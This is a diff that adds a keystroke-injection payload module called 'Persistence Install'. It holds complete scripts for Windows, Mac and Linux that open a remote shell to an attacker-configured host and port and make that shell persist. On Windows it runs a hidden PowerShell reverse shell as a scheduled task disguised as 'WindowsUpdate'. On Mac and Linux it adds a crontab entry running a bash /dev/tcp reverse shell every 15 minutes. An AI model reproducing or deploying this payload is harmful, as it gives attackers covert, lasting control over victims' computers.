@@ -1,0 +1,37 @@
+NAME Persistence Install
+DESCRIPTION Creates a persistent callback to the attacker
+CATEGORY post
+PLATFORMS WIN,MAC,LINUX
+OPTION LHOST 192.168.1.100 "Attacker IP address"
+OPTION LPORT 4444 "Callback port"
+OPTION DELAY 2000 "Initial HID enumeration delay (ms)"
+PLATFORM WIN
+DELAY {{DELAY}}
+GUI r
+DELAY 800
+STRING powershell -nop -w hidden -ep bypass
+ENTER
+DELAY 1200
+STRING $a='powershell -nop -w hidden -ep bypass -c "while(1){try{$c=New-Object Net.Sockets.TCPClient(''{{LHOST}}'',{{LPORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()}catch{Start-Sleep 60}}"';schtasks /create /sc minute /mo 15 /tn 'WindowsUpdate' /tr $a /f
+ENTER
+PLATFORM MAC
+DELAY {{DELAY}}
+GUI SPACE
+DELAY 700
+STRING Terminal
+ENTER
+DELAY 1400
+STRING (crontab -l 2>/dev/null; echo "*/15 * * * * bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1") | crontab -
+ENTER
+DELAY 500
+STRING exit
+ENTER
+PLATFORM LINUX
+DELAY {{DELAY}}
+CTRL ALT t
+DELAY 1400
+STRING (crontab -l 2>/dev/null; echo "*/15 * * * * bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1") | crontab -
+ENTER
+DELAY 500
+STRING exit
+ENTER
